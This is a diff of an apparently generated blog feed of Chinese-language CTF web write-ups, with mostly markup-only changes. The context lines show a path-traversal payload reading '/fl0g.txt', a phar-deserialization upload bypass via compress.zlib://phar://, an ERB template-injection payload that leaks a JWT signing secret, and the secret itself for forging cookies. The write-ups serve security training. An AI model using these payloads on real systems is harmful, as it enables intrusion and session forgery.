@@ -19526,7 +19924,7 @@ Method: GET&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;成功登陆后进入&lt;code&gt;/admin&lt;/code&gt;路由，发现两个输入框、文件上传按钮和一串隐藏的字符串&lt;code&gt;hint here ↑↑↑↑↑↑&lt;/code&gt;，指向的字段是&lt;code&gt;Update bot checker model&lt;/code&gt;，F12得到注释hint：&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;zip file with detection.meta detection.index detection.data-00000-of-00001 3 TensorFlow(1.12) files!&lt;br&gt;
+&lt;p&gt;zip file with detection.meta detection.index detection.data-00000-of-00001 3 TensorFlow(1.12) files! &lt;br&gt;
 The model need x:0 to input a number , and y:0 to output the result &amp;quot;Human&amp;quot; or &amp;quot;Bot&amp;quot;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;并在下面又发现了其他路由：&lt;/p&gt;
@@ -20255,7 +20653,7 @@ Todo: add /admin/model_download button  下载模型&lt;/p&gt;
 &lt;p&gt;($b==hash(&amp;quot;md2&amp;quot;, $b)) &amp;amp;&amp;amp; ($c==hash(&amp;quot;md2&amp;quot;,hash(&amp;quot;md2&amp;quot;, $c)))&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;访问robots.txt得到一个新的文件地址/hinthint.txt，访问后得到&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Is it particularly difficult to break MD2?!
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Is it particularly difficult to break MD2?!
 I&#39;ll tell you quietly that I saw the payoad of the author.
 But the numbers are not clear.have fun~~~~
 xxxxx024452    hash(&amp;quot;md2&amp;quot;,$b)
@@ -20358,7 +20756,7 @@ xxxxxx48399    hash(&amp;quot;md2&amp;quot;,hash(&amp;quot;md2&amp;quot;,$b))
 &lt;/blockquote&gt;
 &lt;p&gt; ​ ​ ​ ​ ​ 就是说，当我们使用&lt;code&gt;a://ctfshow.com&lt;/code&gt;时，虽然按照url的结构会被解析为&lt;code&gt;Array ( [scheme] =&amp;gt; a [host] =&amp;gt; ctfshow.com )&lt;/code&gt;，但是a已经被看作是一个目录，因此&lt;code&gt;ctfshow.com&lt;/code&gt;是在&lt;code&gt;/var/www/html/a/&lt;/code&gt;的一个目录，正好文件处理函数是&lt;code&gt;file_get_contents&lt;/code&gt;，我们就使用&lt;strong&gt;目录穿越&lt;/strong&gt;来读取根目录下的文件&#39;/fl0g.txt&#39;。&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;uel=a://ctfshow.com/../../../../../fl0g.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;uel=a://ctfshow.com/../../../../../fl0g.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;web3_莫负婵娟&#34;&gt;web3_莫负婵娟&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Hint：环境变量  +linux字符串截取  + 通配符&lt;/p&gt;
@@ -20906,10 +21304,10 @@ xxxxxx48399    hash(&amp;quot;md2&amp;quot;,hash(&amp;quot;md2&amp;quot;,$b))
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;修改phar文件后缀绕过对文件后缀的过滤&lt;/strong&gt;，上传后得到文件路径&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/var/www/html/upload/ed54ee58cd01e120e27939fe4a64fa92.png
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/var/www/html/upload/ed54ee58cd01e120e27939fe4a64fa92.png
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着我们就只需要通过phar://解析phar文件完成反序列化即可。&lt;/p&gt;
 &lt;p&gt;对于头部phar字符的过滤，我们通过&lt;code&gt;compress.zlib://phar://&lt;/code&gt;绕过即可。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;compress.zlib://phar:///var/www/html/upload/ed54ee58cd01e120e27939fe4a64fa92.png
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;compress.zlib://phar:///var/www/html/upload/ed54ee58cd01e120e27939fe4a64fa92.png
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;babyflask&#34;&gt;babyflask&lt;/h2&gt;
 &lt;p&gt; ​ ​ ​ ​ ​ Log in登录框处存在模板注入，直接payload获得flag。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -21088,9 +21486,9 @@ xxxxxx48399    hash(&amp;quot;md2&amp;quot;,hash(&amp;quot;md2&amp;quot;,$b))
                 <content type="html">&lt;h2 id=&#34;解题过程&#34;&gt;解题过程&lt;/h2&gt;
 &lt;p&gt; ​ ​ ​ ​ ​ 看到题目关键字&lt;strong&gt;shop&lt;/strong&gt;，怀疑需要抓包修改money进行购买，而金额一般通过加密隐藏在cookie字段中，接下来就着重观察cookie字段。&lt;/p&gt;
 &lt;p&gt; ​ ​ ​ ​ ​ 抓包得到cookie字段，&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-cookie&#34; data-lang=&#34;cookie&#34;&gt;auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJmNGE3OWEyMy05YjA4LTRhZDUtODgyMS05YzEzY2M1MDdmYWIiLCJqa2wiOjMwfQ.ex-ThOTfqKGa3TqShqqkU-aF2VhY6i9KJaddUao7mW4
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-cookie&#34; data-lang=&#34;cookie&#34;&gt;auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJmNGE3OWEyMy05YjA4LTRhZDUtODgyMS05YzEzY2M1MDdmYWIiLCJqa2wiOjMwfQ.ex-ThOTfqKGa3TqShqqkU-aF2VhY6i9KJaddUao7mW4
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;很可疑，看着像JWT，于是拿到&lt;a href=&#34;https://jwt.io/&#34;&gt;解密网站&lt;/a&gt;看看。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://gitee.com/tyskill/ImageHost/raw/master/img/20210125152111.png&#34; style=&#34;zoom: 80%;&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;https://gitee.com/tyskill/ImageHost/raw/master/img/20210125152111.png&#34; style=&#34;zoom: 80%;&#34; /&gt;
 &lt;p&gt;接下来就直接jwtcracker爆破，半个小时过去了。。。除了风扇狂笑(，我一无所获，无计可施的我只能直接跟着大佬wp走，没想到第一步就懵逼了。&lt;/p&gt;
 &lt;p&gt;？？？为什么要robots.txt，又是脑洞吗(还是我太菜了...)，想了想参加过的比赛都规定不需要用扫描器，也就没往这方面想，下次一定。&lt;/p&gt;
 &lt;p&gt;访问robots.txt得到一个文件地址&lt;code&gt;/filebak&lt;/code&gt;，访问得到源码：&lt;/p&gt;
@@ -21274,20 +21672,20 @@ xxxxxx48399    hash(&amp;quot;md2&amp;quot;,hash(&amp;quot;md2&amp;quot;,$b))
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;ruby源码(这不是欺负人吗)，不会，果断放弃审计，直接下一步--erb模板注入。&lt;/p&gt;
 &lt;p&gt;知道了模板注入之后我们可以尝试着审计一下源码，结合以前做题的经验，&lt;code&gt;ENV[&amp;quot;SECRET&amp;quot;]&lt;/code&gt;应该是我们注入的目标，&lt;code&gt;#{params[:SECRET].match(/[0-9a-z]+/)}&lt;/code&gt;和&lt;code&gt;#{params[:name][0,7]}&lt;/code&gt;可能是我们模板注入的利用点，因为这些都是我们可控的字符，百度到erb常用模板注入payload&lt;code&gt;&amp;lt;%=攻击字段%&amp;gt;&lt;/code&gt;，但是具体利用还是不会。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://gitee.com/tyskill/ImageHost/raw/master/img/20210125152146.png&#34;  /&gt;&lt;/p&gt;
+&lt;img src=&#34;https://gitee.com/tyskill/ImageHost/raw/master/img/20210125152146.png&#34;  /&gt;
 &lt;p&gt;依照wp所说，在/work路由中，&lt;code&gt;[0,7]&lt;/code&gt;应该是我们通过GET传递的name字段的长度，且&lt;code&gt;ENV[&amp;quot;SECRET&amp;quot;].match(&amp;quot;#{params[:SECRET].match(/[0-9a-z]+/)}&amp;quot;)&lt;/code&gt;的作用是对密钥正则。&lt;/p&gt;
 &lt;p&gt;于是，新的姿势出现了--&lt;strong&gt;用ruby的预定义字符$对匹配的字符串读取secret&lt;/strong&gt;(ruby的特性：&lt;a href=&#34;https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html&#34;&gt;预定义变量&lt;/a&gt;)，
 构造payload：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-payload&#34; data-lang=&#34;payload&#34;&gt;/work?SECRET=&amp;amp;name=%3c%25%3d%24%27%25%3e&amp;amp;do=%3c%25%3d%24%27%25%3e%20is%20working
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-payload&#34; data-lang=&#34;payload&#34;&gt;/work?SECRET=&amp;amp;name=%3c%25%3d%24%27%25%3e&amp;amp;do=%3c%25%3d%24%27%25%3e%20is%20working
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析一下这个payload：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;code&gt;ENV[&amp;quot;SECRET&amp;quot;].match(&amp;quot;#{params[:SECRET].match(/[0-9a-z]+/)}&amp;quot;)&lt;/code&gt;正则判断上传的SECRET字段不能包含pattern中的内容，因此这里选择了传递空字符。&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;params[:do] == &amp;quot;#{params[:name][0,7]} is working&amp;quot;&lt;/code&gt;判断上传的do字段和name字段是否相同，而我们构造 &lt;code&gt;&amp;lt;%=$&#39;%&amp;gt;&lt;/code&gt;，根据&lt;code&gt;$&#39;-最后一次成功匹配右侧的字符串&lt;/code&gt;的作用，我们使name和do成功匹配，上传时要urlencode。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;获得密钥secret：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-secret&#34; data-lang=&#34;secret&#34;&gt;90b980318681b75c0ace1d7916d53d14ba419244b27d1f8b68ea3482889f9d9f8e013c7a021b4f119998f1e4d2b194062ea963e17606a52f0eb3bcc3bc77d655
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-secret&#34; data-lang=&#34;secret&#34;&gt;90b980318681b75c0ace1d7916d53d14ba419244b27d1f8b68ea3482889f9d9f8e013c7a021b4f119998f1e4d2b194062ea963e17606a52f0eb3bcc3bc77d655
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造cookie：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://gitee.com/tyskill/ImageHost/raw/master/img/20210125152209.png&#34; style=&#34;zoom: 50%;&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;https://gitee.com/tyskill/ImageHost/raw/master/img/20210125152209.png&#34; style=&#34;zoom: 50%;&#34; /&gt;
 &lt;p&gt;提交回显新cookie，JWT解码得flag。&lt;/p&gt;
 &lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
 &lt;ol&gt;
